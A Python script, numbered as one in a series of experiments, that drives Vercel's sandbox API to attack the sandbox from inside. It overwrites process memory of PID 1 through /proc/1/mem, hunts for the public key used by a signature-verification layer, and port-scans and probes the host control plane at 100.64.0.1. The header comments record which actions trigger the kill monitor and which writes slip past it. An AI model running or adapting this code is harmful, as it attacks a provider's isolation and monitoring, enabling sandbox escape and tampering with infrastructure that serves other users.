# 实验J191: A)text段写入测试 B)rodata公钥定位 C)宿主控制面100.64.0.1端口扫描
# j190: 杀触发=CPV头(全局验签中间件); 23456同防护; /proc/1/mem写放行(C3 rodata翻转成功)
#       C4 data段头(Go moduledata)翻转自崩=>写入本身不触发监控, 是写坏运行时结构
#       C1: 100.64.42.105:23456 <-> 100.64.0.1:58852 ESTABLISHED(宿主控制面连接!)
# 本步: 1)text段可写性验证(ELF头+代码区, 读回确认) 2)rodata找WVN8gckg公钥位置
#       3)扫描100.64.0.1宿主端口(放最后, 可能触发监控)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=12000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj191"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, socket
out = open("/tmp/d191.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")

def memrw(addr, flip=True, restore=True):
    """读1字节, 翻转写回, 读回验证, 还原"""
    fd = os.open("/proc/1/mem", os.O_RDWR)
    os.lseek(fd, addr, 0)
    orig = os.read(fd, 1)
    if not orig:
        p("READ_EMPTY", hex(addr))
        os.close(fd)
        return None
    os.lseek(fd, addr, 0)
    nw = os.write(fd, bytes([orig[0] ^ 0xFF]))
    os.lseek(fd, addr, 0)
    after = os.read(fd, 1)
    if restore:
        os.lseek(fd, addr, 0)
        os.write(fd, orig)
        os.lseek(fd, addr, 0)
        restored = os.read(fd, 1)
        p("MEMRW", hex(addr), "orig", orig.hex(), "wrote", nw,
          "after", after.hex(), "restored", restored.hex())
    else:
        p("MEMRW", hex(addr), "orig", orig.hex(), "wrote", nw, "after", after.hex())
    os.close(fd)
    return (orig, after)

# A1: text段 ELF头 (0x400000) 翻转写+还原
p("CP", "A1")
memrw(0x400000)
p("A1_ALIVE")
out.flush()

# A2: text段代码区 (0x401000) 翻转写+还原
p("CP", "A2")
memrw(0x401000)
p("A2_ALIVE")
out.flush()

# A3: heap区 (0xe9e100) 翻转写+还原 (j190 C2无变化写成功, 这次变化写)
p("CP", "A3")
memrw(0xe9e100)
p("A3_ALIVE")
out.flush()

# B1: rodata找 WVN8gckg (公钥base64) + 前后256B
p("CP", "B1")
fd = os.open("/proc/1/mem", os.O_RDONLY)
hits = []
pos = 0x8db000
while pos < 0xe30000:
    os.lseek(fd, pos, 0)
    d = os.read(fd, 65536)
    if not d:
        break
    idx = d.find(b"WVN8gckg")
    if idx >= 0:
        hits.append(pos + idx)
        p("PUBKEY", hex(pos + idx))
        ctx = d[max(0, idx - 128):idx + 384]
        p("CTX", ctx.replace(b"\x00", b".").replace(b"\n", b" ")[:480])
        out.flush()
        break
    pos += len(d)
os.close(fd)
p("B1_DONE", hits if hits else "NOHIT")
out.flush()

# C1: 宿主控制面 100.64.0.1 端口扫描 (最后测)
p("CP", "C1")
ports = [58852, 50051, 8080, 9090, 3000, 8000, 8888, 9000, 6443, 10250,
         80, 443, 10000, 23456, 30001, 30002, 22, 2379, 7000, 4000]
for port in ports:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.2)
        s.connect(("100.64.0.1", port))
        p("OPEN", port)
        try:
            s.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
            d = s.recv(512)
            p("BANNER", port, d[:200])
        except Exception:
            pass
        s.close()
    except Exception as ex:
        p("CLOSED", port, repr(ex)[:60])
    out.flush()
p("C1_DONE")
p("done")
out.close()
'''

st = run_cmd(sid, CODE, "J191", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d191.txt", "marker", 16000)
if st == "DEAD":
    print("\n!!! DEATH -> trigger located in marker above", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
